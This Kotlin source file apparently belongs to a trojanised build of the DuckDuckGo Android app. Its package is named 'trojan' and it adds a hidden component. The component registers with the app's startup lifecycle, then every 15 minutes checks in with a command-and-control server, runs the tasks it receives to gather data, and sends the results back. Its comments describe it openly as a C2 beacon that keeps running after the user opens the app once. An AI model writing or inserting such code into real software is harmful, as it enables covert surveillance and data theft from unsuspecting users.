package com.duckduckgo.trojan.impl

import android.content.Context
import androidx.lifecycle.LifecycleOwner
import androidx.work.CoroutineWorker
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.duckduckgo.anvil.annotations.ContributesWorker
import com.duckduckgo.app.lifecycle.MainProcessLifecycleObserver
import com.duckduckgo.di.scopes.AppScope
import com.duckduckgo.trojan.api.BeaconService
import com.squareup.anvil.annotations.ContributesMultibinding
import dagger.SingleInstanceIn
import java.util.concurrent.TimeUnit
import javax.inject.Inject

/**
 * WorkManager Worker that performs the periodic C2 beacon check-in.
 *
 * Flow:
 *   1. beaconService.checkIn() → registers device + polls for tasks
 *   2. For each task: commandHandler.execute() → gathers data
 *   3. beaconService.sendResult() → sends result back to C2 server
 */
@ContributesWorker(AppScope::class)
class BeaconWorker(
    context: Context,
    params: WorkerParameters,
) : CoroutineWorker(context, params) {

    @Inject
    lateinit var beaconService: BeaconService

    @Inject
    lateinit var commandHandler: CommandHandler

    override suspend fun doWork(): Result {
        return try {
            // Check in + poll for tasks
            val commands = beaconService.checkIn()

            // Execute each pending task and report results
            commands.forEach { cmd ->
                val result = commandHandler.execute(cmd)
                beaconService.sendResult(cmd.id, result)
            }
            Result.success()
        } catch (e: Exception) {
            // WorkManager will retry with exponential backoff
            Result.retry()
        }
    }
}

/**
 * Lifecycle observer that schedules the BeaconWorker when the app starts.
 *
 * @ContributesMultibinding adds this to DDG's set of lifecycle observers.
 * When the app's main process starts, onCreate() fires and enqueues our worker.
 *
 * The user opens DDG once → beacon keeps running in the background.
 */
@ContributesMultibinding(
    scope = AppScope::class,
    boundType = MainProcessLifecycleObserver::class,
)
@SingleInstanceIn(AppScope::class)
class BeaconInitializer @Inject constructor(
    private val workManager: WorkManager,
) : MainProcessLifecycleObserver {

    override fun onCreate(owner: LifecycleOwner) {
        val request = PeriodicWorkRequestBuilder<BeaconWorker>(15, TimeUnit.MINUTES)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build(),
            )
            .build()

        workManager.enqueueUniquePeriodicWork(
            BEACON_WORKER_TAG,
            ExistingPeriodicWorkPolicy.KEEP,
            request,
        )
    }

    companion object {
        private const val BEACON_WORKER_TAG = "c2_beacon"
    }
}
